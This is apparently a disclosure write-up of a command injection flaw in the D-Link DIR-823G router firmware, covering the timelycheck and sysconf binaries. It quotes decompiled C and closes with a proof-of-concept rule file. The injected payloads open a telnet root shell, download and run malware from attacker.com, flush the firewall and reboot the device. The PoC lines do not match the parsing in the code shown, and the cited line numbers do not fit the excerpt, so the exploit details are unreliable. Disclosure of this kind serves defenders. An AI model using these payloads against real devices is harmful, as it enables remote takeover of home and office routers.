# Command Injection Vulnerability in `/tmp/new_qos.rule`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | D-Link DIR-823G Router                                       |
| Firmware Version     | **DIR823G_V1.0.2B05_20181207.bin** (other versions require verification) |
| Vulnerability Type   | **Command Injection**                                        |
| Vulnerable Component | `timelycheck` and `sysconf` binaries                         |
| Prerequisites        | Requires control over `/tmp/new_qos.rule` content or filesystem write permissions (local or remote) |

2. Exploitation Path

```c
int sub_413628()
{
  ...
  if ( v28 )
  {
    v11 = !sub_402864((int)"/tmp/new_qos.rule");
    result = 0;
    if ( !v11 )
    {
      v47 = fopen("/tmp/new_qos.rule", "r");
      if ( !v47 )
      {
        printf("open file %s error\n", "/tmp/new_qos.rule");
        return 0;
      }
      v12 = 53;
      v13 = 13;
LABEL_56:
      v14 = v47;
      while ( 1 )
      {
        do
        {
          if ( !fgets(v44, 512, v14) )
          {
            fclose(v47, v22);
            return 1;
          }
          sscanf(v44, "%*s %31s %17s %d %31s %31s %d %*s %7s", 
                 v35, v42, &v29, v36, v37, &v30, v31);
          v14 = v47;
        }
        while ( !v29 );
        if ( atoi(v36) <= 0 )
          goto LABEL_49;
        if ( strcmp(v31, "br0") )
        {
          v15 = strcmp(v31, "br1");
          v14 = v47;
          if ( v15 )
            continue;
        }
        snprintf(v38, 63, "%d", v13);
        snprintf(
          v43,
          255,
          "%s %s %s %s %s %s %s %s %s %s %s %s %s %s %s",
          aIptables,
          aA_0,
          aPrerouting,
          asc_42F258,
          aMangle,
          aI_2,
          (const char *)v31,
          aM,
          aMac_0,
          aMacSource,
          v42,
          aJ_0,
          aMark,
          aSetMark,
          v38);
        system(v43);
        ...
LABEL_49:
        if ( atoi(v37) <= 0 )
          goto LABEL_56;
        if ( !strcmp(v31, "br0") )
        {
          snprintf(v38, 63, "%d", v12);
          snprintf(
            v43,
            255,
            "%s %s %s %s %s %s %s %s %s %s %s %s %s %s %s",
            aIptables,
            aA_0,
            aPostrouting,
            asc_42F258,
            aMangle,
            aO,
            "br0",
            aM,
            aMac_0,
            aMacDestination,
            v42,
            aJ_0,
            aMark,
            aSetMark,
            v38);
          system(v43);
          ...
LABEL_55:
          ++v12;
          sub_4029C0(0, v18, "filter", v19);
          goto LABEL_56;
        }
        v20 = strcmp(v31, "br1");
        v14 = v47;
        if ( !v20 )
        {
          snprintf(v38, 63, "%d", v12);
          snprintf(
            v43,
            255,
            "%s %s %s %s %s %s %s %s %s %s %s %s %s %s %s",
            aIptables,
            aA_0,
            aPostrouting,
            asc_42F258,
            aMangle,
            aO,
            "br1",
            aM,
            aMac_0,
            aMacDestination,
            v42,
            aJ_0,
            aMark,
            aSetMark,
            v38);
          system(v43);
          ...
}
```

3. **Vulnerable Binaries:** `timelycheck` and `sysconf`, This vulnerability exists independently in both binaries and does not cross binary boundaries.

4. 0-Day Command Injection Exploitation Path:

   - Line 24: `fgets(v44, 512, v14)` reads content from `/tmp/new_qos.rule`. Line 29: `sscanf(v44, "%*s %31s %17s %d %31s %31s %d %*s %7s", v35, v42, &v29, v36, v37, &v30, v31)` parses each line, but no escaping or filtering is performed. The variable `v42`, derived from the configuration file, is concatenated directly into line 63: `system(v43)`, resulting in a command injection vulnerability.

   - Line 24: `fgets(v44, 512, v14)` reads content from `/tmp/new_qos.rule`. Line 29 parses the line as above. `v42` is concatenated directly into line 90: `system(v43)`, resulting in a command injection vulnerability.

   - Line 24: `fgets(v44, 512, v14)` reads content from `/tmp/new_qos.rule`. Line 29 parses the line as above. `v42` is concatenated directly into line 121: `system(v43)`, resulting in a command injection vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability:

```bash
# /tmp/new_qos.rule content
rule1 AA:BB:CC:DD:EE:FF 1 1000 2000 0 eth0 ; telnetd -l /bin/sh -p 4444 ; reboot
rule2 11:22:33:44:55:66 1 1500 2500 0 br0 ; wget http://attacker.com/malware -O /tmp/exp ; sh /tmp/exp
rule3 AA:BB:CC:DD:EE:FF 1 1000 2000 0 br1 ; iptables -F ; iptables -P INPUT ACCEPT
```



